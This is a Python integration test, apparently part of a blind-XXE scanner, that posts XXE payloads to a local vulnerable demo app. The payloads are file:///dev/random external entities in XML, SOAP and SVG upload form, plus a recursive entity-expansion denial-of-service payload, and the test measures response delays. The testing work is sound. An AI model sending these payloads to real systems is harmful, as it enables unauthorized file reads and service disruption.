"""
Blind XXE Integration Test - Against Vulnerable Demo App

Tests XXE detection against live demo app endpoints:
1. /api/parse (XML body parsing)
2. /soap (SOAP web service)
3. /upload (File upload with XXE)

Requirements:
- Demo app running on http://127.0.0.1:8000
- Start with: python demo_vuln_app/app.py --port 8000

Run with: python test_xxe_against_demo_app.py
"""

import requests
import time
import json
import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from bxe.modules.blind_xxe import BlindXXEModule
from bsqli.core.logger import get_logger


logger = get_logger(__name__)


class XXEDemoTester:
    """Test XXE detection against demo app"""
    
    def __init__(self, demo_url: str = "http://127.0.0.1:8000"):
        """
        Initialize tester.
        
        Args:
            demo_url: Base URL of demo app
        """
        self.demo_url = demo_url
        self.module = BlindXXEModule(timeout=15)
        self.findings = []
        
        # Verify demo app is running
        self._verify_demo_app()
    
    def _verify_demo_app(self):
        """Verify demo app is accessible"""
        try:
            resp = requests.get(f"{self.demo_url}/", timeout=5)
            if resp.status_code == 200:
                logger.info(f"Demo app is running at {self.demo_url}")
                return True
        except Exception as e:
            logger.error(f"Demo app not accessible: {e}")
            print(f"\nERROR: Demo app not running at {self.demo_url}")
            print("Start the demo app with:")
            print("  python demo_vuln_app/app.py --port 8000")
            sys.exit(1)
    
    def test_parse_xml_endpoint(self):
        """Test /api/parse endpoint (XML body parsing)"""
        logger.info("Testing /api/parse endpoint")
        print("\n" + "="*70)
        print("TEST 1: XML Body Parsing (/api/parse)")
        print("="*70)
        
        url = f"{self.demo_url}/api/parse"
        
        # Test 1: Time-based XXE via /dev/random
        print("\n[*] Testing time-based XXE via /dev/random...")
        
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>"""
        
        try:
            start = time.time()
            resp = requests.post(
                url,
                data=xxe_payload,
                headers={"Content-Type": "application/xml"},
                timeout=15
            )
            elapsed = time.time() - start
            
            print(f"    Response time: {elapsed:.2f}s")
            print(f"    Status code: {resp.status_code}")
            
            if elapsed > 2.5:  # Should delay due to /dev/random
                print(f"    [!] DETECTED: Time delay indicates XXE")
                self.findings.append({
                    "endpoint": "/api/parse",
                    "technique": "time_based",
                    "method": "dev_random",
                    "response_time": elapsed,
                    "confidence": "HIGH",
                })
            else:
                print(f"    Response was too fast (expected > 2.5s)")
        
        except Exception as e:
            logger.error(f"Test error: {e}")
            print(f"    ERROR: {e}")
        
        # Test 2: Recursive entity expansion
        print("\n[*] Testing recursive entity expansion...")
        
        recursive_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<foo>&lol4;</foo>"""
        
        try:
            start = time.time()
            resp = requests.post(
                url,
                data=recursive_payload,
                headers={"Content-Type": "application/xml"},
                timeout=15
            )
            elapsed = time.time() - start
            
            print(f"    Response time: {elapsed:.2f}s")
            print(f"    Status code: {resp.status_code}")
            
            if elapsed > 1.5:
                print(f"    [!] DETECTED: Recursive entity expansion delayed response")
                self.findings.append({
                    "endpoint": "/api/parse",
                    "technique": "time_based",
                    "method": "entity_expansion",
                    "response_time": elapsed,
                    "confidence": "HIGH",
                })
        
        except Exception as e:
            logger.error(f"Test error: {e}")
            print(f"    ERROR: {e}")
        
        # Test 3: Control payload (should not delay)
        print("\n[*] Testing control payload (valid XML, no XXE)...")
        
        control_payload = """<?xml version="1.0" encoding="UTF-8"?>
<foo>
  <bar>test</bar>
</foo>"""
        
        try:
            start = time.time()
            resp = requests.post(
                url,
                data=control_payload,
                headers={"Content-Type": "application/xml"},
                timeout=15
            )
            elapsed = time.time() - start
            
            print(f"    Response time: {elapsed:.2f}s")
            print(f"    Status code: {resp.status_code}")
            
            if elapsed < 1.0:
                print(f"    [✓] Control payload responded normally (not vulnerable)")
        
        except Exception as e:
            logger.error(f"Test error: {e}")
    
    def test_soap_endpoint(self):
        """Test /soap endpoint (SOAP web service)"""
        logger.info("Testing /soap endpoint")
        print("\n" + "="*70)
        print("TEST 2: SOAP Web Service (/soap)")
        print("="*70)
        
        url = f"{self.demo_url}/soap"
        
        # Test SOAP with XXE
        print("\n[*] Testing SOAP endpoint with XXE...")
        
        soap_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetData>
      <input>&xxe;</input>
    </GetData>
  </soap:Body>
</soap:Envelope>"""
        
        try:
            start = time.time()
            resp = requests.post(
                url,
                data=soap_payload,
                headers={"Content-Type": "application/soap+xml"},
                timeout=15
            )
            elapsed = time.time() - start
            
            print(f"    Response time: {elapsed:.2f}s")
            print(f"    Status code: {resp.status_code}")
            
            if elapsed > 2.5:
                print(f"    [!] DETECTED: SOAP endpoint vulnerable to XXE")
                self.findings.append({
                    "endpoint": "/soap",
                    "technique": "time_based",
                    "method": "dev_random",
                    "response_time": elapsed,
                    "confidence": "HIGH",
                })
            else:
                print(f"    No delay detected")
        
        except Exception as e:
            logger.error(f"Test error: {e}")
            print(f"    ERROR: {e}")
    
    def test_upload_endpoint(self):
        """Test /upload endpoint (file upload)"""
        logger.info("Testing /upload endpoint")
        print("\n" + "="*70)
        print("TEST 3: File Upload (/upload)")
        print("="*70)
        
        url = f"{self.demo_url}/upload"
        
        # Test SVG upload with XXE
        print("\n[*] Testing SVG file upload with XXE...")
        
        svg_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>"""
        
        try:
            files = {
                'file': ('test.svg', svg_payload, 'image/svg+xml')
            }
            
            start = time.time()
            resp = requests.post(
                url,
                files=files,
                timeout=15
            )
            elapsed = time.time() - start
            
            print(f"    Response time: {elapsed:.2f}s")
            print(f"    Status code: {resp.status_code}")
            
            if elapsed > 2.5:
                print(f"    [!] DETECTED: File upload vulnerable to XXE")
                self.findings.append({
                    "endpoint": "/upload",
                    "technique": "time_based",
                    "method": "file_upload",
                    "response_time": elapsed,
                    "confidence": "HIGH",
                })
            else:
                print(f"    No delay detected")
        
        except Exception as e:
            logger.error(f"Test error: {e}")
            print(f"    ERROR: {e}")
    
    def save_findings(self):
        """Save findings to JSON file"""
        output_file = Path(__file__).parent / "bxe" / "output" / "findings_xxe_demo.json"
        output_file.parent.mkdir(parents=True, exist_ok=True)
        
        with open(output_file, "w") as f:
            json.dump(self.findings, f, indent=2)
        
        print(f"\n[*] Findings saved to {output_file}")
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "="*70)
        print("SUMMARY")
        print("="*70)
        print(f"Total XXE vulnerabilities found: {len(self.findings)}")
        
        for i, finding in enumerate(self.findings, 1):
            print(f"\n[{i}] {finding['endpoint']}")
            print(f"    Technique: {finding['technique']}")
            print(f"    Method: {finding['method']}")
            print(f"    Response Time: {finding['response_time']:.2f}s")
            print(f"    Confidence: {finding['confidence']}")
        
        print("\n" + "="*70)


def main():
    """Run XXE demo tests"""
    print("\n" + "="*70)
    print("BLIND XXE INTEGRATION TEST - Demo App")
    print("="*70)
    
    try:
        tester = XXEDemoTester()
        
        # Run all tests
        tester.test_parse_xml_endpoint()
        tester.test_soap_endpoint()
        tester.test_upload_endpoint()
        
        # Save findings
        tester.save_findings()
        
        # Print summary
        tester.print_summary()
        
        return len(tester.findings) > 0
    
    except Exception as e:
        logger.error(f"Test suite error: {e}", exc_info=True)
        print(f"\nERROR: {e}")
        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
